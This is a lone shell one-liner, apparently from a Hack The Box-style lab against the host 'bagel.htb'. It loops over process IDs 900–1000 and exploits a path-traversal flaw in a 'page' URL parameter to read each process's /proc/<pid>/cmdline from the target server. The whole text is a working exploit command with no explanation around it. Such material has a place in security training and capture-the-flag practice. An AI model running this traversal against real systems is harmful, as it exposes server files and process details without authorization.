for i in $(seq 900 1000); do curl bagel.htb:8000/?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done
